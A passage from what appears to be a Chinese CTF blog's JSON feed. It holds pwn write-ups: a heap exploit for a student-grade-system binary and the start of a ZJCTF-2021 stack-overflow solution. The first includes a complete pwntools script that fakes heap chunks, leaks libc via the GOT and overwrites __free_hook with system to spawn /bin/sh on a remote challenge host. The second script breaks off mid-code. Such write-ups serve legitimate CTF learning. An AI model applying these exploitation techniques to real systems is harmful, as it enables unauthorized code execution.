删除掉 std_info 块，即保存 stu_num 指针和成绩的堆块（紧接着便会申请回来）</p>\n<p><img src=\"/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/image-20220121153508830.png\" alt=\"image-20220121153508830\"></p>\n<p>重新申请回这个堆块时将 stu_num 指针写成一个 got 表的地址，这样打印信息时就可以泄露出 libc</p>\n<p><img src=\"/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/image-20220121153911658.png\" alt=\"image-20220121153911658\"></p>\n<p>之后再次在 bss 段伪造堆块，释放后修改 fd 指针（其实就是修改密码）指向 free_hook，将 free_hook 改成 system 就行了</p>\n<p><img src=\"/CTF/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F/image-20220121154609394.png\" alt=\"image-20220121154609394\"></p>\n<p>Exp</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./EasyCPP'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('./libc.so.6')</span>\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'redirect.do-not-trust.hacking.run'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'10075'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu64<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nuu32<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> ras<span class=\"token punctuation\">(</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': \\033[1;36m 0x%x \\033[0m'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">ras</span><span class=\"token punctuation\">(</span> data <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span> <span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> data\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'choice:'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    buf <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span> BitVec<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'x%s'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>  <span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> buf<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">|</span> <span class=\"token operator\">~</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> buf<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">|</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> target<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    m <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    res <span class=\"token operator\">=</span> <span class=\"token builtin\">sorted</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">[</span>d<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> d <span class=\"token keyword\">in</span> m<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> key <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span>\n        result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> result\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">editStudent</span><span class=\"token punctuation\">(</span>password <span class=\"token punctuation\">,</span> stdnum <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'password:'</span> <span class=\"token punctuation\">,</span> password <span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'please:'</span> <span class=\"token punctuation\">,</span> stdnum<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n\ndbg_args <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''Grade::Grade\nb Grade::operator\nb Grade::~Grade\nb free\n'''</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    pwd <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Username:'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Password:'</span> <span class=\"token punctuation\">,</span> pwd<span class=\"token punctuation\">)</span>\n    \n<span class=\"token comment\"># 其实在最开始尝试的时候就发现了，更改的密码输入过长会导致直接让程序崩溃</span>\n<span class=\"token comment\"># 后来经过调试才知道 free 的时候 free 了一个错误的内存地址</span>\n<span class=\"token comment\"># 再调试确定偏移为 0x80 </span>\n\n    passwd_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000006032E0</span>\n    setvbuf_got <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000602F20</span>\n    T_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000006032A0</span>\n\n    fake_chunk <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span>\n    <span class=\"token punctuation\">)</span>\n\n    editStudent<span class=\"token punctuation\">(</span> fake_chunk<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span> <span class=\"token punctuation\">)</span>\n    editStudent<span class=\"token punctuation\">(</span> fake_chunk<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>passwd_addr<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x20'</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># dbg()</span>\n\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'STUDENT: '</span><span class=\"token punctuation\">)</span>\n    leak <span class=\"token operator\">=</span> uu64<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span>\n    libc_base <span class=\"token operator\">=</span> leak <span class=\"token keyword\">if</span> leak <span class=\"token operator\">&lt;</span><span class=\"token number\">0x47000000</span> <span class=\"token keyword\">else</span> leak <span class=\"token operator\">-</span> <span class=\"token number\">0x47000000</span>\n\n    fake_chunk <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span>\n    <span class=\"token punctuation\">)</span>\n\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span> <span class=\"token punctuation\">,</span> libc_base<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg(dbg_args)</span>\n    editStudent<span class=\"token punctuation\">(</span> fake_chunk<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>setvbuf_got<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    setvbuf_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> setvbuf_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'setvbuf'</span><span class=\"token punctuation\">]</span>\n    system_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n    __free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\n    binsh_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\n\n    fake_chunk <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span>\n    <span class=\"token punctuation\">)</span>\n\n    editStudent<span class=\"token punctuation\">(</span> fake_chunk<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>passwd_addr<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">)</span>\n    editStudent<span class=\"token punctuation\">(</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span> <span class=\"token punctuation\">,</span> __free_hook <span class=\"token operator\">-</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span> <span class=\"token punctuation\">,</span> system_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x27</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n    editStudent<span class=\"token punctuation\">(</span> <span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span> <span class=\"token punctuation\">,</span> system_addr <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x27</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 这题有很多 free 操作，直接疯狂填 /bin/sh\\x00，肯定能执行 system（/bin/sh）</span>\n\n    \n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n",
            "tags": [
                "PWN",
                "堆"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/ZJCTF-2021-Pwn/",
            "url": "http://niyah.cn/CTF/ZJCTF-2021-Pwn/",
            "title": "ZJCTF-2021-Pwn",
            "date_published": "2021-10-30T02:10:27.000Z",
            "content_html": "<blockquote>\n<p>做题有点慢，破栈溢出调了个半天</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"sai_easy\"><a class=\"markdownIt-Anchor\" href=\"#sai_easy\">#</a> sai_easy</h1>\n<p>本题显然是栈溢出</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030130815657.png\" alt=\"img\"></p>\n<p>在最后 strcat 字符串拼接的时候会直接栈溢出，我们可以直接覆盖返回地址</p>\n<p>覆盖到前面  cat flag 的地方即可</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030130940078.png\" alt=\"image-20211030130940078\"></p>\n<p>exp</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token comment\"># context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./sai_easy_pwn'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># context.log_level = 'debug'</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'50100'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span 